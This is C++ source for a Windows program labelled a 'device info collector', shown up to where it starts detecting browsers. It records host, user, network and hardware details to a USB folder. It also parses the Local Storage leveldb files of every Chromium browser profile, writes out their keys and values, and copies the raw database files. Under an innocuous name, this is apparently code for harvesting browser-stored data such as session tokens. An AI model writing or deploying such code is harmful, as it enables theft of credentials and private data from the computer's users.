#define _WIN32_WINNT 0x0601   // Windows 7 minimum for std::filesystem shim
#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <sstream>
#include <filesystem>
#include <algorithm>
#include <cstdint>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "advapi32.lib")

namespace fs = std::filesystem;

// ════════════════════════════════════════════════════════════════════════════════
//  WIDE / UTF-8 HELPERS
//  All paths go through wide-char APIs so Unicode usernames, drive labels,
//  and directory names never get corrupted.
// ════════════════════════════════════════════════════════════════════════════════

std::wstring getExeDirW() {
    // Dynamic buffer — handles paths longer than MAX_PATH (260)
    std::wstring buf(32768, L'\0');
    DWORD len = GetModuleFileNameW(NULL, buf.data(), (DWORD)buf.size());
    if (len == 0) return L".";
    buf.resize(len);
    auto pos = buf.find_last_of(L"\\/");
    return (pos != std::wstring::npos) ? buf.substr(0, pos) : L".";
}

std::wstring getEnvW(const wchar_t* name) {
    wchar_t buf[32768] = {};
    DWORD len = GetEnvironmentVariableW(name, buf, (DWORD)std::size(buf));
    return (len > 0) ? std::wstring(buf, len) : L"";
}

std::string wToUtf8(const std::wstring& w) {
    if (w.empty()) return "";
    int sz = WideCharToMultiByte(CP_UTF8, 0,
        w.data(), (int)w.size(), nullptr, 0, nullptr, nullptr);
    if (sz <= 0) return "";
    std::string out(sz, '\0');
    WideCharToMultiByte(CP_UTF8, 0,
        w.data(), (int)w.size(), out.data(), sz, nullptr, nullptr);
    return out;
}

// Registry read — W variant so Unicode product names survive
std::string regReadW(HKEY root, const wchar_t* subkey, const wchar_t* val) {
    HKEY hKey = NULL;
    if (RegOpenKeyExW(root, subkey, 0, KEY_READ, &hKey) != ERROR_SUCCESS)
        return "";
    wchar_t buf[1024] = {};
    DWORD size = sizeof(buf), type = 0;
    RegQueryValueExW(hKey, val, NULL, &type, (LPBYTE)buf, &size);
    RegCloseKey(hKey);
    return wToUtf8(buf);
}

// ════════════════════════════════════════════════════════════════════════════════
//  GENERAL UTILITIES
// ════════════════════════════════════════════════════════════════════════════════

std::string sep(char c = '=', int n = 80) { return std::string(n, c); }

// Create a directory (and parents). Returns true on success or already-exists.
bool ensureDir(const fs::path& p) {
    std::error_code ec;
    fs::create_directories(p, ec);
    return !ec || fs::is_directory(p);
}

// Copy a file as raw binary. Returns true on success.
bool copyRaw(const fs::path& src, const fs::path& dst) {
    std::error_code ec;
    fs::copy_file(src, dst, fs::copy_options::overwrite_existing, ec);
    return !ec;
}

// Check ofstream health; show an error box and return false if bad.
bool checkStream(std::ofstream& f, const std::string& where) {
    if (f.good()) return true;
    MessageBoxA(NULL,
        ("Write error — disk may be full or write-protected.\n"
         "Output: " + where).c_str(),
        "devinfo - WRITE ERROR", MB_OK | MB_ICONERROR);
    return false;
}

// ════════════════════════════════════════════════════════════════════════════════
//  NETWORK HELPERS
// ════════════════════════════════════════════════════════════════════════════════

// GetAdaptersInfo with automatic buffer-overflow retry (handles many VPN adapters)
std::vector<BYTE> getAdaptersBuf() {
    ULONG bufLen = 16384;
    std::vector<BYTE> buf;
    for (int i = 0; i < 5; i++) {
        buf.resize(bufLen);
        DWORD ret = GetAdaptersInfo(
            reinterpret_cast<PIP_ADAPTER_INFO>(buf.data()), &bufLen);
        if (ret == NO_ERROR)   return buf;
        if (ret != ERROR_BUFFER_OVERFLOW) break;
        // bufLen was updated by the API to the size it actually needs
    }
    return {};
}

// ════════════════════════════════════════════════════════════════════════════════
//  BROWSER / LEVELDB HELPERS
// ════════════════════════════════════════════════════════════════════════════════

// Try opening a file with no sharing (exclusive).
// Returns true if we could open it = no other process holds it.
bool canOpenExclusive(const fs::path& p) {
    HANDLE h = CreateFileW(p.wstring().c_str(),
        GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return false;
    CloseHandle(h);
    return true;
}

// Is the LevelDB directory locked by a running browser?
// Strategy:
//   1. If LOCK file exists and we can't open it exclusively → locked.
//   2. If LOCK file absent, probe the first .log file we find.
//   3. If neither exists → not locked (empty / fresh profile).
bool isLdbLocked(const fs::path& ldbDir) {
    fs::path lockFile = ldbDir / "LOCK";
    if (fs::exists(lockFile))
        return !canOpenExclusive(lockFile);

    // No LOCK file — some Chromium forks omit it; probe a .log file instead
    try {
        for (auto& e : fs::directory_iterator(ldbDir)) {
            std::string ext = e.path().extension().string();
            std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
            if (ext == ".log")
                return !canOpenExclusive(e.path());
        }
    } catch (...) {}
    return false; // nothing to probe → assume unlocked
}

// Enumerate all Chromium profiles under a User Data directory.
// Returns paths like: User Data/Default, User Data/Profile 1, …
std::vector<fs::path> enumProfiles(const fs::path& userDataDir) {
    std::vector<fs::path> profiles;
    if (!fs::exists(userDataDir)) return profiles;

    fs::path def = userDataDir / "Default";
    if (fs::exists(def)) profiles.push_back(def);

    try {
        for (auto& e : fs::directory_iterator(userDataDir)) {
            if (!e.is_directory()) continue;
            std::string n = e.path().filename().string();
            if (n.rfind("Profile ", 0) == 0)   // "Profile 1", "Profile 2" …
                profiles.push_back(e.path());
        }
    } catch (...) {}
    return profiles;
}

// ═══════════════════════════════════════════════════════════════════════════════
//  SNAPPY DECOMPRESSOR (minimal, zero external dependencies)
//  LevelDB SSTable blocks are Snappy-compressed by default.
// ═══════════════════════════════════════════════════════════════════════════════

namespace Snappy {

inline uint32_t u32le(const uint8_t* p) {
    return (uint32_t)p[0] | ((uint32_t)p[1] << 8) |
           ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24);
}

// Decode the length portion of a Snappy tag.
// Advances *pos past any extension bytes. Returns false on truncation/invalid.
bool decodeLen(const uint8_t* d, size_t& pos, size_t size,
               uint8_t tag, size_t& out)
{
    size_t len = (tag >> 2) & 0x3F;
    if (len < 60) {
        out = len + 1;
        return true;
    }
    if (len == 60) {
        if (pos >= size) return false;
        out = (size_t)d[pos++] + 1 + 60;
        return true;
    }
    if (len == 61) {
        if (pos + 2 > size) return false;
        out = (size_t)d[pos] | ((size_t)d[pos + 1] << 8);
        pos += 2;
        out += 1 + 60;
        return true;
    }
    if (len == 62) {
        if (pos + 4 > size) return false;
        out = u32le(d + pos);
        pos += 4;
        out += 1 + 60;
        return true;
    }
    return false; // len == 63 is reserved / invalid
}

bool decompress(const uint8_t* input, size_t inputSize,
                std::vector<uint8_t>& output)
{
    output.clear();
    size_t pos = 0;
    while (pos < inputSize) {
        uint8_t tag = input[pos++];
        switch (tag & 0x03) {
        case 0: { // literal
            size_t len;
            if (!decodeLen(input, pos, inputSize, tag, len)) return false;
            if (pos + len > inputSize) return false;
            output.insert(output.end(), input + pos, input + pos + len);
            pos += len;
            break;
        }
        case 1: { // copy 1-byte offset
            size_t len;
            if (!decodeLen(input, pos, inputSize, tag, len)) return false;
            if (pos >= inputSize) return false;
            size_t offset = (size_t)input[pos++] + 1;
            if (offset > output.size()) return false;
            for (size_t i = 0; i < len; i++)
                output.push_back(output[output.size() - offset]);
            break;
        }
        case 2: { // copy 4-byte offset
            size_t len;
            if (!decodeLen(input, pos, inputSize, tag, len)) return false;
            if (pos + 4 > inputSize) return false;
            size_t offset = u32le(input + pos) + 1;
            pos += 4;
            if (offset > output.size()) return false;
            for (size_t i = 0; i < len; i++)
                output.push_back(output[output.size() - offset]);
            break;
        }
        case 3: { // copy 2-byte offset
            size_t len;
            if (!decodeLen(input, pos, inputSize, tag, len)) return false;
            if (pos + 2 > inputSize) return false;
            size_t offset = ((size_t)input[pos] | ((size_t)input[pos + 1] << 8)) + 1;
            pos += 2;
            if (offset > output.size()) return false;
            for (size_t i = 0; i < len; i++)
                output.push_back(output[output.size() - offset]);
            break;
        }
        }
    }
    return pos == inputSize;
}

} // namespace Snappy

// ═══════════════════════════════════════════════════════════════════════════════
//  LEVELDB .LOG PARSER
// ═══════════════════════════════════════════════════════════════════════════════
namespace LevelDB {

const size_t kBlockSize  = 32768;
const size_t kHeaderSize = 7;   // crc(4)+len(2)+type(1)

enum RecordType : uint8_t { kZero=0, kFull=1, kFirst=2, kMiddle=3, kLast=4 };

inline uint16_t u16le(const uint8_t* p) {
    return (uint16_t)p[0] | ((uint16_t)p[1]<<8);
}
inline uint32_t u32le(const uint8_t* p) {
    return (uint32_t)p[0]|((uint32_t)p[1]<<8)|
           ((uint32_t)p[2]<<16)|((uint32_t)p[3]<<24);
}

// LevelDB variable-length integer decoder
bool varint32(const uint8_t* buf, size_t size, size_t& pos, uint32_t& out) {
    out = 0;
    for (int shift = 0; shift < 35; shift += 7) {
        if (pos >= size) return false;
        uint8_t b = buf[pos++];
        out |= (uint32_t)(b & 0x7F) << shift;
        if (!(b & 0x80)) return true;
    }
    return false;
}

// UTF-16 LE → UTF-8 (BMP), used because Chrome stores strings as UTF-16 LE
std::string utf16leToUtf8(const uint8_t* d, size_t len) {
    std::string out;
    for (size_t i = 0; i + 1 < len; i += 2) {
        uint16_t cp = (uint16_t)d[i] | ((uint16_t)d[i+1] << 8);
        if (!cp) continue;
        if (cp < 0x80)        { out += (char)cp; }
        else if (cp < 0x800)  { out += (char)(0xC0|(cp>>6)); out += (char)(0x80|(cp&0x3F)); }
        else                  { out += (char)(0xE0|(cp>>12)); out += (char)(0x80|((cp>>6)&0x3F)); out += (char)(0x80|(cp&0x3F)); }
    }
    return out;
}

bool isUtf16LE(const uint8_t* d, size_t len) {
    if (len < 4 || len % 2) return false;
    int zeros = 0;
    size_t check = std::min(len, (size_t)32);
    for (size_t i = 1; i < check; i += 2)
        if (!d[i]) zeros++;
    return zeros >= (int)(check / 4);
}

std::string printable(const uint8_t* d, size_t len) {
    std::string out;
    for (size_t i = 0; i < len; i++) {
        uint8_t c = d[i];
        if (c >= 32 && c < 127)              out += (char)c;
        else if (c=='\n'||c=='\r'||c=='\t')  out += (char)c;
        else                                  out += '.';
    }
    return out;
}

std::string decode(const uint8_t* d, size_t len) {
    if (!len) return "";
    if (len > 2 && isUtf16LE(d+1, len-1)) return utf16leToUtf8(d+1, len-1);
    if (isUtf16LE(d, len))                 return utf16leToUtf8(d, len);
    return printable(d, len);
}

struct Entry { bool deleted; std::string key, value; };

// Parse one WriteBatch: SeqNum(8) + Count(4) + [Type+Key+Val ...]
// Returns number of entries that failed to decode (truncated/corrupt).
std::vector<Entry> parseWriteBatch(const std::vector<uint8_t>& data,
                                   int& skipped)
{
    std::vector<Entry> entries;
    skipped = 0;
    if (data.size() < 12) return entries;

    uint32_t count = u32le(data.data() + 8);
    size_t   pos   = 12;
    const uint8_t* buf  = data.data();
    size_t         size = data.size();

    for (uint32_t i = 0; i < count && pos < size; i++) {
        uint8_t type = buf[pos++];
        uint32_t kLen = 0;
        if (!varint32(buf, size, pos, kLen) || pos+kLen > size) { skipped++; break; }
        std::string key = decode(buf+pos, kLen);
        pos += kLen;

        if (type == 1) {   // kTypeValue
            uint32_t vLen = 0;
            if (!varint32(buf, size, pos, vLen) || pos+vLen > size) { skipped++; break; }
            entries.push_back({ false, key, decode(buf+pos, vLen) });
            pos += vLen;
        } else if (type == 0) {  // kTypeDeletion
            entries.push_back({ true, key, "" });
        } else {
            skipped++;   // unknown type — corrupt record
            break;
        }
    }
    return entries;
}

struct ParseResult {
    std::vector<Entry> entries;
    int    skippedEntries = 0;
    bool   opened         = false;  // false = couldn't open (locked / AV)
    DWORD  openError      = 0;
};

// Parse one .log file. Re-checks the lock right before opening
// to minimise the race window between our initial lock check and read.
ParseResult parseLogFile(const fs::path& path) {
    ParseResult res;

    // Re-check: try exclusive open first
    HANDLE hTest = CreateFileW(path.wstring().c_str(),
        GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hTest == INVALID_HANDLE_VALUE) {
        res.openError = GetLastError();
        return res;   // opened stays false → caller does raw fallback
    }
    CloseHandle(hTest);

    // Now open for real (shared read is fine — we just confirmed it's not locked)
    std::ifstream f(path, std::ios::binary);
    if (!f) { res.openError = GetLastError(); return res; }

    std::vector<uint8_t> file(
        (std::istreambuf_iterator<char>(f)),
         std::istreambuf_iterator<char>());
    if (file.empty()) { res.opened = true; return res; }

    res.opened = true;
    std::vector<uint8_t> fragment;
    size_t pos = 0, fileSize = file.size();

    while (pos + kHeaderSize <= fileSize) {
        size_t off = pos % kBlockSize;
        if (off + kHeaderSize > kBlockSize) { pos += (kBlockSize - off); continue; }

        const uint8_t* hdr  = file.data() + pos;
        uint16_t       len  = u16le(hdr + 4);
        uint8_t        type = hdr[6];
        pos += kHeaderSize;

        if (!len && type == kZero) {
            size_t rem = kBlockSize - (pos % kBlockSize);
            pos += rem ? rem : kBlockSize;
            continue;
        }
        if (pos + len > fileSize) break;

        const uint8_t* payload = file.data() + pos;
        pos += len;

        auto flush = [&]() {
            int sk = 0;
            auto e = parseWriteBatch(fragment, sk);
            res.entries.insert(res.entries.end(), e.begin(), e.end());
            res.skippedEntries += sk;
            fragment.clear();
        };

        switch ((RecordType)type) {
        case kFull:   fragment.assign(payload, payload+len); flush(); break;
        case kFirst:  fragment.assign(payload, payload+len);          break;
        case kMiddle: fragment.insert(fragment.end(), payload, payload+len); break;
        case kLast:   fragment.insert(fragment.end(), payload, payload+len); flush(); break;
        default:      fragment.clear(); res.skippedEntries++;          break;
        }
    }
    return res;
}

} // namespace LevelDB

// ═══════════════════════════════════════════════════════════════════════════════
//  LEVELDB SSTABLE (.ldb) PARSER
//  Layout:
//    [data blocks ...]
//    [index block]
//    [filter block] (optional)
//    [metaindex block] (optional)
//    [footer]  <- 48 bytes, magic number last 8 bytes
//  Each block is Snappy-compressed by default.
// ═══════════════════════════════════════════════════════════════════════════════

namespace SSTable {

const uint64_t kTableMagic = 0x807243626d796458ULL;

struct BlockHandle { uint64_t offset = 0; uint64_t size = 0; };

struct Footer {
    BlockHandle metaindex;
    BlockHandle index;
    bool valid = false;
};

struct DataEntry { std::string key; std::string value; };

struct IndexEntry { std::string key; BlockHandle handle; };

// Read a little-endian varint (max 10 bytes for uint64).
bool readVarint(const uint8_t* p, size_t& pos, size_t size, uint64_t& out) {
    out = 0;
    for (int shift = 0; shift < 64; shift += 7) {
        if (pos >= size) return false;
        uint8_t b = p[pos++];
        out |= (uint64_t)(b & 0x7F) << shift;
        if (!(b & 0x80)) return true;
    }
    return false;
}

inline uint32_t u32le(const uint8_t* p) {
    return (uint32_t)p[0] | ((uint32_t)p[1] << 8) |
           ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24);
}

inline uint64_t u64le(const uint8_t* p) {
    return (uint64_t)u32le(p) | ((uint64_t)u32le(p + 4) << 32);
}

// Parse the 48-byte footer from the end of an .ldb file.
// fileSize is used to sanity-check that block handles point inside the file.
Footer parseFooter(const std::vector<uint8_t>& buf, uintmax_t fileSize) {
    Footer f;
    if (buf.size() < 48) return f;
    size_t pos = 0;
    uint64_t mo, ms, io, is;
    if (!readVarint(buf.data(), pos, buf.size(), mo)) return f;
    if (!readVarint(buf.data(), pos, buf.size(), ms)) return f;
    if (!readVarint(buf.data(), pos, buf.size(), io)) return f;
    if (!readVarint(buf.data(), pos, buf.size(), is)) return f;
    f.metaindex = {mo, ms};
    f.index     = {io, is};
    if (u64le(buf.data() + 40) != kTableMagic) return f;
    // Sanity: index block must live inside the file
    if (io + is > fileSize) return f;
    f.valid = true;
    return f;
}

// Read a block from disk at [offset, offset+size) and decompress.
// Falls back to raw data if Snappy decompression fails (some forks store
// blocks uncompressed).
bool readBlock(const fs::path& path, uint64_t offset, uint64_t size,
               std::vector<uint8_t>& out)
{
    std::ifstream f(path, std::ios::binary);
    if (!f) return false;
    f.seekg((std::streamoff)offset);
    if (!f) return false;
    std::vector<uint8_t> compressed(size);
    f.read(reinterpret_cast<char*>(compressed.data()),
           (std::streamsize)size);
    if ((size_t)f.gcount() != size) return false;

    if (Snappy::decompress(compressed.data(), size, out))
        return true;

    // Fallback: treat as uncompressed
    out = std::move(compressed);
    return true;
}

// Parse a decompressed data block into key/value entries.
// Layout: [entries...][restart points...][num_restarts uint32 LE]
bool parseDataBlock(const uint8_t* data, size_t size,
                    std::vector<DataEntry>& entries)
{
    entries.clear();
    if (size < 4) return false;
    uint32_t numRestarts = u32le(data + size - 4);
    size_t restartsEnd = size - 4;
    size_t restartsStart = restartsEnd - (size_t)numRestarts * 4;
    if (restartsStart > restartsEnd) return false;

    size_t pos = 0;
    std::string prevKey;
    while (pos < restartsStart) {
        uint64_t shared, nonShared, vLen;
        if (!readVarint(data, pos, restartsStart, shared)) break;
        if (!readVarint(data, pos, restartsStart, nonShared)) break;
        if (!readVarint(data, pos, restartsStart, vLen)) break;
        if (shared == 0) prevKey.clear();           // restart point
        if (pos + nonShared > restartsStart) break;
        prevKey.append(reinterpret_cast<const char*>(data + pos), nonShared);
        pos += nonShared;
        if (pos + vLen > restartsStart) break;
        std::string value(reinterpret_cast<const char*>(data + pos), vLen);
        pos += vLen;
        entries.push_back({prevKey, value});
    }
    return true;
}

// Parse a decompressed index block into (key, BlockHandle) entries.
// Same internal entry format as data blocks; the "value" is a block handle
// encoded as offset-varint + size-varint.
bool parseIndexBlock(const uint8_t* data, size_t size,
                     std::vector<IndexEntry>& entries)
{
    entries.clear();
    if (size < 4) return false;
    uint32_t numRestarts = u32le(data + size - 4);
    size_t restartsEnd = size - 4;
    size_t restartsStart = restartsEnd - (size_t)numRestarts * 4;
    if (restartsStart > restartsEnd) return false;

    size_t pos = 0;
    std::string prevKey;
    while (pos < restartsStart) {
        uint64_t shared, nonShared, vLen;
        if (!readVarint(data, pos, restartsStart, shared)) break;
        if (!readVarint(data, pos, restartsStart, nonShared)) break;
        if (!readVarint(data, pos, restartsStart, vLen)) break;
        if (shared == 0) prevKey.clear();
        if (pos + nonShared > restartsStart) break;
        prevKey.append(reinterpret_cast<const char*>(data + pos), nonShared);
        pos += nonShared;
        if (pos + vLen > restartsStart) break;
        // value bytes: offset varint + size varint
        size_t hp = pos;
        uint64_t ho, hs;
        if (!readVarint(data, hp, restartsStart, ho)) break;
        if (!readVarint(data, hp, restartsStart, hs)) break;
        pos = hp;
        entries.push_back({prevKey, {ho, hs}});
    }
    return true;
}

// Parse one .ldb SSTable file, appending all key/value entries to out.
// Returns true if the file was recognised as a LevelDB table and parsed.
bool parseLdbFile(const fs::path& path, std::vector<DataEntry>& out) {
    std::error_code ec;
    uintmax_t fileSize = fs::file_size(path, ec);
    if (ec || fileSize < 48) return false;

    std::ifstream f(path, std::ios::binary);
    if (!f) return false;
    f.seekg((std::streamoff)(fileSize - 48));
    if (!f) return false;
    std::vector<uint8_t> footerBuf(48);
    f.read(reinterpret_cast<char*>(footerBuf.data()), 48);
    if ((size_t)f.gcount() != 48) return false;

    Footer footer = parseFooter(footerBuf, fileSize);
    if (!footer.valid) return false;

    // Read + decompress the index block
    std::vector<uint8_t> indexBlock;
    if (!readBlock(path, footer.index.offset, footer.index.size, indexBlock))
        return false;

    std::vector<IndexEntry> indexEntries;
    if (!parseIndexBlock(indexBlock.data(), indexBlock.size(), indexEntries))
        return false;

    // Read + decompress every data block referenced by the index
    for (auto& ie : indexEntries) {
        std::vector<uint8_t> dataBlock;
        if (!readBlock(path, ie.handle.offset, ie.handle.size, dataBlock))
            continue;
        std::vector<DataEntry> blockEntries;
        if (!parseDataBlock(dataBlock.data(), dataBlock.size(), blockEntries))
            continue;
        for (auto& e : blockEntries) out.push_back(e);
    }
    return true;
}

} // namespace SSTable

// ═══════════════════════════════════════════════════════════════════════════════
//  PROCESS ONE CHROMIUM PROFILE'S leveldb DIRECTORY
// ═══════════════════════════════════════════════════════════════════════════════
void processLevelDB(const fs::path& ldbDir,
                    const std::string& browserName,
                    const fs::path& runDir,
                    std::ofstream& out)
{
    auto L = [&](const std::string& s) { out << s << "\n"; };

    if (!fs::exists(ldbDir)) { L("    (no leveldb directory)"); return; }

    if (isLdbLocked(ldbDir)) {
        L("    [LOCKED] Browser is running — listing files only:");
        try {
            for (auto& e : fs::directory_iterator(ldbDir)) {
                uintmax_t sz = 0;
                try { sz = e.file_size(); } catch (...) {}
                L("      " + e.path().filename().string()
                  + "  (" + std::to_string(sz) + " B)");
            }
        } catch (...) { L("      (access denied)"); }
        return;
    }

    // ── Parse .log files ─────────────────────────────────────────────────────
    int totalEntries = 0;
    std::vector<fs::path> rawFallback;

    try {
        for (auto& e : fs::directory_iterator(ldbDir)) {
            std::string ext = e.path().extension().string();
            std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
            if (ext != ".log") continue;

            auto res = LevelDB::parseLogFile(e.path());

            if (!res.opened) {
                L("    [WARN] Cannot open " + e.path().filename().string()
                  + "  (error " + std::to_string(res.openError) + ") — copying raw");
                rawFallback.push_back(e.path());
                continue;
            }

            totalEntries += (int)res.entries.size();
            if (res.skippedEntries)
                L("    [WARN] " + e.path().filename().string()
                  + " — " + std::to_string(res.skippedEntries)
                  + " corrupt/truncated record(s) skipped");

            for (auto& en : res.entries) {
                if (en.deleted) {
                    L("    [DEL] " + en.key);
                } else {
                    std::string val = (en.value.size() > 300)
                        ? en.value.substr(0, 300) + " ...(truncated)"
                        : en.value;
                    L("    [KEY] " + en.key);
                    L("    [VAL] " + val);
                    L("");
                }
            }
        }
    } catch (...) { L("    (directory iteration error)"); }

    if (totalEntries == 0 && rawFallback.empty())
        L("    (no entries — may be empty or already compacted to .ldb)");

    // ── Raw fallback copies ───────────────────────────────────────────────────
    for (auto& src : rawFallback) {
        std::string destName = browserName + "_" + src.filename().string();
        bool ok = copyRaw(src, runDir / destName);
        L("    [RAW] " + src.filename().string() + " -> " + destName
          + (ok ? " [saved]" : " [COPY FAILED]"));
    }

    // ── Parse .ldb SSTables (older compacted data) ───────────────────────────
    bool hasLdb = false;
    try {
        for (auto& e : fs::directory_iterator(ldbDir)) {
            std::string ext = e.path().extension().string();
            std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
            if (ext != ".ldb") continue;
            if (!hasLdb) {
                L("");
                L("    [.ldb SSTables — parsed with Snappy + raw copy]");
                hasLdb = true;
            }
            uintmax_t sz = 0;
            try { sz = e.file_size(); } catch (...) {}

            std::vector<SSTable::DataEntry> entries;
            bool parsed = SSTable::parseLdbFile(e.path(), entries);
            if (parsed) {
                L("      " + e.path().filename().string()
                  + "  (" + std::to_string(sz) + " B)"
                  + "  [parsed: " + std::to_string(entries.size()) + " entries]");
                for (auto& en : entries) {
                    std::string val = (en.value.size() > 300)
                        ? en.value.substr(0, 300) + " ...(truncated)"
                        : en.value;
                    L("    [KEY] " + en.key);
                    L("    [VAL] " + val);
                    L("");
                }
            } else {
                L("      " + e.path().filename().string()
                  + "  (" + std::to_string(sz) + " B)"
                  + "  [SSTable parse failed — raw copy only]");
            }

            // Always keep a raw copy as backup
            std::string destName = browserName + "_" + e.path().filename().string();
            bool ok = copyRaw(e.path(), runDir / destName);
            L("      [RAW] " + e.path().filename().string() + " -> " + destName
              + (ok ? " [saved]" : " [copy failed]"));
        }
    } catch (...) {}
}

// ═══════════════════════════════════════════════════════════════════════════════
//  MAIN
// ═══════════════════════════════════════════════════════════════════════════════
int main() {
    WSADATA wsa = {};
    WSAStartup(MAKEWORD(2, 2), &wsa);

    fs::path exeDir = fs::path(getExeDirW());

    // ── Write-access pre-check ───────────────────────────────────────────────
    {
        fs::path testFile = exeDir / L"devinfo_writetest.tmp";
        HANDLE h = CreateFileW(testFile.wstring().c_str(),
            GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
            FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE, NULL);
        if (h == INVALID_HANDLE_VALUE) {
            DWORD err = GetLastError();
            std::string msg =
                "Cannot write to:\n" + wToUtf8(exeDir.wstring()) + "\n\n";
            if (err == ERROR_WRITE_PROTECT)
                msg += "Drive is write-protected.\n"
                       "Flip the USB write-protect switch.";
            else
                msg += "Windows error code: " + std::to_string(err);
            MessageBoxA(NULL, msg.c_str(), "devinfo - ERROR", MB_OK | MB_ICONERROR);
            WSACleanup();
            return 1;
        }
        CloseHandle(h);
    }

    // ── Timestamped output folder (with PID to avoid same-second collisions) ─
    SYSTEMTIME st = {};
    GetLocalTime(&st);
    char dirStamp[64];
    sprintf_s(dirStamp,
        "devinfo_%04d%02d%02d_%02d%02d%02d_pid%lu",
        st.wYear, st.wMonth, st.wDay,
        st.wHour, st.wMinute, st.wSecond,
        GetCurrentProcessId());

    fs::path runDir = exeDir / "logs" / dirStamp;
    if (!ensureDir(runDir)) {
        MessageBoxA(NULL,
            ("Cannot create output folder:\n" + wToUtf8(runDir.wstring())).c_str(),
            "devinfo - ERROR", MB_OK | MB_ICONERROR);
        WSACleanup();
        return 1;
    }

    fs::path   outPath = runDir / "info.txt";
    std::ofstream out(outPath);
    if (!out.is_open()) {
        MessageBoxA(NULL,
            ("Cannot create info.txt in:\n" + wToUtf8(runDir.wstring())).c_str(),
            "devinfo - ERROR", MB_OK | MB_ICONERROR);
        WSACleanup();
        return 1;
    }

    std::string runDirStr = wToUtf8(runDir.wstring()); // for error messages
    auto L = [&](const std::string& s) { out << s << "\n"; };
    auto S = [&](char c='=', int n=80)  { out << sep(c,n) << "\n"; };

    // ── Header ───────────────────────────────────────────────────────────────
    S(); L("  DEVICE INFO COLLECTOR  v4.0"); S(); L("");
    char timebuf[64];
    sprintf_s(timebuf, "Date : %04d-%02d-%02d  %02d:%02d:%02d",
        st.wYear,st.wMonth,st.wDay,st.wHour,st.wMinute,st.wSecond);
    L(timebuf);
    L("Run  : " + runDirStr);
    L("");

    // ════════════════════════════════════════════════════════════════════════
    //  [1] DEVICE INFO
    // ════════════════════════════════════════════════════════════════════════
    S('-',40); L("[1] DEVICE INFO"); S('-',40);

    // Hostname / Username — W variants handle Unicode domain names
    wchar_t hostname[256]={}, username[256]={};
    DWORD hlen=sizeof(hostname)/sizeof(wchar_t),
          ulen=sizeof(username)/sizeof(wchar_t);
    GetComputerNameW(hostname, &hlen);
    GetUserNameW(username, &ulen);
    L("Hostname : " + wToUtf8(hostname));
    L("User     : " + wToUtf8(username));
    L("");

    // IPv4 / MAC — retry on buffer overflow
    L("[IPv4 / MAC]");
    auto abuf = getAdaptersBuf();
    if (!abuf.empty()) {
        for (auto* p = reinterpret_cast<PIP_ADAPTER_INFO>(abuf.data()); p; p=p->Next) {
            std::string ip = p->IpAddressList.IpAddress.String;
            if (ip == "0.0.0.0" || ip.rfind("169.254.",0)==0) continue;
            char mac[32];
            sprintf_s(mac,"%02X-%02X-%02X-%02X-%02X-%02X",
                p->Address[0],p->Address[1],p->Address[2],
                p->Address[3],p->Address[4],p->Address[5]);
            L("  IPv4 : " + ip);
            L("  MAC  : " + std::string(mac));
            L("  Desc : " + std::string(p->Description));
            L("");
        }
    } else L("  (failed to get adapter info)");

    // OS
    L("[OS]");
    std::string osName  = regReadW(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"ProductName");
    std::string osBuild = regReadW(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"CurrentBuildNumber");
    {
        HKEY hKey=NULL;
        std::string full = osName + "  Build " + osBuild;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
            L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
            0, KEY_READ, &hKey)==ERROR_SUCCESS) {
            DWORD ubr=0, sz=sizeof(ubr), type=0;
            if (RegQueryValueExW(hKey,L"UBR",NULL,&type,(LPBYTE)&ubr,&sz)==ERROR_SUCCESS
                && type==REG_DWORD)
                full += "." + std::to_string(ubr);
            RegCloseKey(hKey);
        }
        L("  " + full);
    }
    L("");

    // CPU
    L("[CPU]");
    L("  " + regReadW(HKEY_LOCAL_MACHINE,
        L"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
        L"ProcessorNameString"));
    L("");

    // RAM
    L("[RAM]");
    MEMORYSTATUSEX mem={}; mem.dwLength=sizeof(mem);
    GlobalMemoryStatusEx(&mem);
    char mBuf[64];
    sprintf_s(mBuf, "  Total : %.2f GB  |  Free : %.2f GB",
        (double)mem.ullTotalPhys/(1ULL<<30),
        (double)mem.ullAvailPhys/(1ULL<<30));
    L(mBuf); L("");

    // GPU — proper subkey enumeration via opened parent handle
    L("[GPU]");
    {
        const wchar_t* gpuKey =
            L"SYSTEM\\CurrentControlSet\\Control\\Class\\"
            L"{4d36e968-e325-11ce-bfc1-08002be10318}";
        HKEY hEnum=NULL;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,gpuKey,0,KEY_READ,&hEnum)==ERROR_SUCCESS) {
            for (DWORD i=0; i<8; i++) {
                wchar_t sub[8]; swprintf_s(sub,L"%04lu",i);
                HKEY hSub=NULL;
                if (RegOpenKeyExW(hEnum,sub,0,KEY_READ,&hSub)==ERROR_SUCCESS) {
                    wchar_t desc[256]={}; DWORD sz=sizeof(desc),type=0;
                    if (RegQueryValueExW(hSub,L"DriverDesc",NULL,&type,(LPBYTE)desc,&sz)==ERROR_SUCCESS
                        && wcslen(desc)>0)
                        L("  " + wToUtf8(desc));
                    RegCloseKey(hSub);
                }
            }
            RegCloseKey(hEnum);
        }
    }
    L("");

    if (!checkStream(out, runDirStr)) { WSACleanup(); return 1; }

    // ════════════════════════════════════════════════════════════════════════
    //  [2] BROWSER DETECTION
    // ════════════════════════════════════════════════════════════════════════
    S(); L("[2] BROWSERS FOUND"); S('-',40);

    fs::path localApp = fs::path(getEnvW(L"LOCALAPPDATA"));
    fs::path roaming  = fs::path(getEnvW(L"APPDATA"));

